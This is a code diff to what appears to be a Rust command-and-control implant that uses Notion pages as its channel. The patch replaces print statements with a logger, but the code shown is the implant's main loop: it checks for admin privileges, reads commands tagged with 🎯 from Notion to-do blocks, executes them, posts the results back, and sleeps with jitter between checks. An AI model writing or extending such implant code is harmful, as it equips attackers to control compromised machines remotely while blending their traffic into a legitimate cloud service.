@@ -29,6 +29,8 @@ use notion::{get_blocks, complete_command, create_page, send_result};
 
 mod cmd;
 use cmd::{NotionCommand, CommandType};
+mod logger;
+
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -69,6 +71,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
+    let logger = logger::Logger::new(config_options.log_level);
+
     // Start Notion App if configured to do so
     if config_options.launch_app {
         #[cfg(windows)] {
@@ -88,13 +92,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut hn = hostname();
 
     let is_admin = cmd::getprivs::is_elevated();  
-    println!("[*] Admin context: {}", is_admin);
+    logger.info(format!("Admin context: {}", is_admin));
     if is_admin {
         hn.push_str("*");
     }
 
-    println!("[*] Hostname: {:?}", hn);
-    //println!("[*] Config options: {:?}", config_options);
+    logger.info(format!("Hostname: {hn}"));
+    logger.debug(format!("Config options: {:?}", config_options));
+
     let mut headers = HeaderMap::new();
     headers.insert("Notion-Version", "2021-08-16".parse()?);
     headers.insert(CONTENT_TYPE, "application/json".parse()?);
@@ -127,9 +132,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             match block["to_do"]["text"][0]["text"]["content"].as_str() {
                 Some(s) => {
                     if s.contains("🎯") {
-                        println!("[*] Got command: {}", s);
+                        logger.info(format!("Got command: {s}"));
                         let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
-                        let output = notion_command.handle(&mut config_options).await?;
+                        let output = notion_command.handle(&mut config_options, &logger).await?;
                         let command_block_id = block["id"].as_str().unwrap();
                         complete_command(&client, block.to_owned()).await;
                         send_result(&client, command_block_id, output).await;
@@ -153,7 +158,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             time::Duration::from_secs(config_options.sleep_interval + jitter_time);
 
         thread::sleep(sleep_time);
-        println!("[*] zzzZZZzzz: {} seconds", config_options.sleep_interval);
-        //println!("[*] Jitter: {}", config_options.jitter_time);
+        logger.info(format!("zzzZZZzzz: {} seconds", config_options.sleep_interval));
+        logger.debug(format!("Jitter: {}", config_options.jitter_time));
     }
 }
